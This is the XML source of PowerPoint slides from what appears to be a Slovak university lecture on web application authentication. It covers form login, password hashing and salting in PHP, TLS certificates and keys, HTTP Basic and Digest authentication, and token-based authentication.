              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>escapovanie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> výstupu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Pozor na UX pri implementácii validácie (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://neal.fun/password-game/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)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A3CD24D-7F50-42DC-8CEA-30FD08EC6C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4576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214BE1-3F62-79E5-83EF-C79B54603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1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76AFCDE-A3DF-F44C-3A4E-657EA8906F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26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="BlokTextu 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E6D5116E-BCE5-C2C4-5DBF-4FF2805EB161}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2285994" y="435645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https://www.fri.uniza.sk/cms/quizzes/questions/qr/31</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Obrázok 7" descr="Obrázok, na ktorom je písmo, text, logo, grafika&#10;&#10;Obsah vygenerovaný pomocou AI môže byť nesprávny.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A9B99E4-2A6C-29FF-C105-836512C16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124" y="906717"/>
            <a:ext cx="4015740" cy="401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49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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435895" y="2282932"/>
            <a:ext cx="8272200" cy="1123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Autentifikácia používateľov vo web aplikáciách</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="255" name="Google Shape;255;p35"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="3406063"/>
            <a:ext cx="8272200" cy="4503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256" name="Google Shape;256;p35"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7918725" y="4467103"/>
            <a:ext cx="7893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27</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Aplikácie s autentifikáciou používateľa</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p36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marR="0" lvl="0" indent="-3302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●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Umožňujú prácu len po prihlásení	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Identifikujú užívateľa počas práce s aplikáciou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Užívatelia si navzájom nemôžu pristupovať k dátam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Na zabezpečenie komunikácie medzi klientom a serverom by sa mal použiť TLS protokol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Možnosti riešenia autentifikácie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Vlastná autentifikácia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Autentifikácia cez </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TLS</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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Autentifikácia cez HTTP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Autentifikácia pomocou tokenov</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="263" name="Google Shape;263;p36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-SK" smtClean="0"/>
              <a:t>28</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Vlastná (formulárová) autentifikácia</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p3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Vyžaduje vždy nejakú aktívnu technológiu na strane servera (PHP, ASP.NET, JSP, ...)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Tvorba formulára s poliami </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1400" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0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Neodosielať formulár metódou GET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Overenie zvyčajne voči DB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Heslá by mali byť v DB uložené pomocou odtlačku (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>hash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"Solenie" hesiel – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>password salting 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Uchovávanie stavu cez </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>premenné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Odhlásenie – zrušenie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>session</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p3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29</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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i="1" dirty="0"/>
              <a:t>Password salting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>– princípy </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="276" name="Google Shape;276;p3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5639442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Pridanie určitého známeho reťazca k heslu (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> sa tvorí z oboch častí)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Napr. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, alebo iný stĺpec z databázy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Znemožňuje odhalenie hesla, aj keby sa útočník dostal k databáze a získal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>hesla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Napr. použitím slovníkového útoku (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>rainbows tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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Ak používateľ heslo používa v iných web aplikáciách, tieto potom nie sú ohrozené</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="-298450">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1100"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>PHP má zabudovanú podporu pre </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>password salting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p3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30</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Obrázok 2" descr="Obrázok, na ktorom je text, snímka obrazovky, písmo&#10;&#10;Obsah vygenerovaný pomocou AI môže byť nesprávny.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC8DBD9D-0F89-55FE-C969-992A0F071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336" y="1635372"/>
            <a:ext cx="2860639" cy="297685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Solenie hesiel – implementácia v PHP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p39"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="1522195"/>
            <a:ext cx="8272200" cy="322053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Ako funguje </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>password salting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>v PHP</a:t>
            </a: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Funkcia na vytvorenie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>hesla:  </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono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Funkcia na overenie hesla (vráti </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>true</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> alebo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>false</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>):  </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="sk-SK" sz="1200" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              <a:sym typeface="Roboto Mono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Výhody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Používa sa vždy aktuálne najbezpečnejší kryptovací algoritmus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PHP automaticky pridá náhodný </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>salt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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Algoritmus používa určitú časovú náročnosť (spomalenie odozvy – sťaženie útoku hrubou silou)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="284" name="Google Shape;284;p39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31</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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183B41-9ED4-4514-8868-6D9AABD4D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050" y="2300338"/>
            <a:ext cx="4517583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sk-SK" altLang="sk-SK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password_hash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PASSWORD_DEFAULT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02114-27FC-4B43-8EFC-AC0649E1E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050" y="2925895"/>
            <a:ext cx="3073277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password_verify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kumimoji="0" lang="sk-SK" altLang="sk-SK" sz="12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Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hash</a:t>
            </a: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sk-SK" altLang="sk-SK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1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SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>TSL protokol</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p41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r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Šifrované spojenie na komunikáciu medzi klientom a serverom</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>TLS je vylepšený nástupca</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>SSL protokolu (po verzii 3.0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Bezpečnejší (napr. je odolný voči </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK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POODLE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> útoku)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Protokol je umiestnený medzi aplikačnou a transportnou vrstvou TCP/IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Prechod je len zmena </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>http:// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>⇒ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>https://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endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Google Shape;299;p41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32</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Grafický objekt 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17CD410B-9460-4C70-9028-2965AE5BC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9162" y="2948051"/>
            <a:ext cx="3127683" cy="1563842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ABA7F714-3993-4C90-8CF6-9028C7A42138}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943129" y="4648843"/>
            <a:ext cx="255642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900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Zdroj: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://hpbn.co/transport-layer-security-tls/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="900" dirty="0">
                <a:latin typeface="Cabin" panose="020B0604020202020204"/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6C3B79-147D-4539-A60B-AA2B7FD4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Možnosti TLS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98E4472-894E-4B65-AE87-226F61623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TLS zabezpečuje:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Šifrovanie správ medzi klientom a serverom </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Autentifikáciu klienta a servera</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Integritu komunikácie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Klient môže overiť autentifikáciu servera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Certifikát vydaný CA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Server môže overiť autentifikáciu klienta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Certifikát vydaný CA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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7AF48A5-EDB0-43ED-980A-DA8309D69E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3606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5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Verejný a súkromný kľúč</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="327" name="Google Shape;327;p45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Asymetrické šifrovanie</a:t>
            </a:r>
          </a:p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Verejný kľúč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Verejne dostupný šifrovací kľúč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Patrí konkrétnemu privátnemu kľúču (tvoria dvojicu)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 súčasťou certifikátu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Pomocou neho ostatní šifrujú správy pre prijímateľa a overujú autentickosť správy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Privátny (súkromný) kľúč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Tajná informácia slúžiaca na podpísanie správy, nesmie sa prezradiť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Mal by byť na bezpečnom zariadení (nemal by ho nikdy opustiť)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Používa sa na šifrovanie odosielaných správ a dešifrovanie prijatých správ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="328" name="Google Shape;328;p45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34</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Autentifikácia servera</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p42"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435900" y="1635376"/>
            <a:ext cx="8272200" cy="33225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/>
              <a:t>Postup pri autentifikácii</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p42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35</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="307" name="Google Shape;30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1772" y="1715947"/>
            <a:ext cx="3618249" cy="299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 dirty="0"/>
              <a:t>Autentifikácia klienta</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="320" name="Google Shape;320;p44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Najbezpečnejší spôsob prihlasovania</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Založený na verejnom a súkromnom kľúči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Nie je nutné ju programovať</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Nutná konfigurácia servera a klienta (zvyčajne inštalácia dodatočného SW)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Podmienka: musíme mať kľúče a k nim certifikát</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="Google Shape;321;p44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36</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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6D6BA-7E91-734A-1E57-4BA7D199C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7ED8FA-2F8B-665C-21B5-4F06C6E49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2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338C7FB-7744-4966-995B-AB41687337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37</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Obrázok 7" descr="Obrázok, na ktorom je písmo, text, logo, grafika&#10;&#10;Obsah vygenerovaný pomocou AI môže byť nesprávny.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5802AED7-7425-192C-9FE5-3236F182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24" y="906717"/>
            <a:ext cx="4015740" cy="4015740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="BlokTextu 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E6C17CE-2F2B-DC46-9543-875CC231D4A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2362200" y="4551462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https://www.fri.uniza.sk/cms/quizzes/questions/qr/32</a:t>
            </a:r>
            <a:endParaRPr lang="sk-S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1038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7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HTTP autentifikácia</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="342" name="Google Shape;342;p47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Umožňuje jednoduchý spôsob autentifikácie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Integrovaná priamo v HTTP </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Nastavuje sa len konfiguráciou servera</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Nie je nutné programovanie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Bez TLS nie je bezpečná</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Prihlasovacie údaje sú posielané vo vnútri HTTP protokolu nešifrované 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Umožňuje vyžadovať prístup aj k HTML súborom a obrázkom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Problémy s odhlasovaním</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="343" name="Google Shape;343;p47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38</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="526617"/>
            <a:ext cx="8272200" cy="760200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="68575" tIns="68575" rIns="68575" bIns="6857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k-SK"/>
              <a:t>Typy HTTP autentifikácie</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="349" name="Google Shape;349;p48"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="1635372"/>
            <a:ext cx="8272200" cy="2758800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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457200" lvl="0" indent="-330200" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="30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Základná (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Basic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Jednoduché zakódovanie mena a hesla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Nie je bezpečná bez SSL</a:t>
            </a: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sk-SK" dirty="0"/>
              <a:t>Rozšírená (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Digest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)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Neposiela sa heslo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sk-SK" dirty="0"/>
              <a:t>Založená na vytvorení zakódovanej (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>) správy</a:t>
            </a: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-US" i="1" dirty="0"/>
              <a:t>hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> sa porovná s tým na serveri</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="350" name="Google Shape;350;p48"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8499550" y="4742725"/>
            <a:ext cx="312600" cy="2739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sk-SK" smtClean="0"/>
              <a:t>39</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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99BF4F-32F8-42B5-A27F-8E26FD7B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Autentifikácia založená na tokenoch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8555311-CDC3-422A-B004-F5976AF12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V určitých prípadoch nie je vhodná autentifikácia založená na </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
